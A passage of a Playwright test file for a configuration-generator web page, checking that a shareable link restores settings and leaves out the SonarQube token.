    await selectCursor(page);
    await page.evaluate(() => document.getElementById('feedbackFab')?.remove());
    await expect(page.locator('#copyLinkBtn')).toBeEnabled();
    await page.locator('#copyLinkBtn').click();
    await page.locator('#copyLinkBtn').click();
    await expect(page.locator('#copyLinkBtn')).toContainText('Copy shareable link', { timeout: 3000 });
  });

  test('Copy shareable link copies URL without token', async ({ page, context }) => {
    await context.grantPermissions(['clipboard-read', 'clipboard-write']);
    await selectCursor(page);
    await page.locator('#envControl .segment-btn[data-value="cloud"]').click();
    await page.locator('#pf-org').fill('share-org');
    await page.locator('#token').fill('sqp_super_secret_token');
    await page.locator('#card-sqc').click();
    await page.locator('#hostedAuth').selectOption('token');
    await expect(page.locator('#copyLinkBtn')).toBeEnabled();
    await page.evaluate(() => document.getElementById('feedbackFab')?.remove());
    await page.locator('#copyLinkBtn').click();
    await expect(page.locator('#copyLinkBtn')).toContainText('Copied');
    const clipboard = await page.evaluate(() => navigator.clipboard.readText());
    expect(clipboard).toContain('agent=cursor');
    expect(clipboard).toContain('org=share-org');
    expect(clipboard).toContain('transport=sqc');
    expect(new URL(clipboard).searchParams.has('token')).toBe(false);
    expect(new URL(clipboard).searchParams.has('SONARQUBE_TOKEN')).toBe(false);
    expect(clipboard).not.toContain('sqp_super_secret_token');
  });

  test('URL params: restores paths with spaces and backslashes', async ({ page }) => {
    const workspacePath = '/Users/Jane Doe/project';
    const certPath = 'C:\\certs\\custom';
    await page.goto(
      '/config-generator.html?agent=cursor&workspaceMount=1'
      + '&workspaceHostPath=' + encodeURIComponent(workspacePath)
      + '&certs=1&certPath=' + encodeURIComponent(certPath),
    );
    await expect(page.locator('#tool-projects')).toBeAttached();
    await expect(page.locator('#opt-workspace-mount')).toBeChecked();
    await expect(page.locator('#workspaceHostPath')).toHaveValue(workspacePath);
    await expect(page.locator('#opt-certs')).toBeChecked();
    await expect(page.locator('#certPath')).toHaveValue(certPath);
  });
});
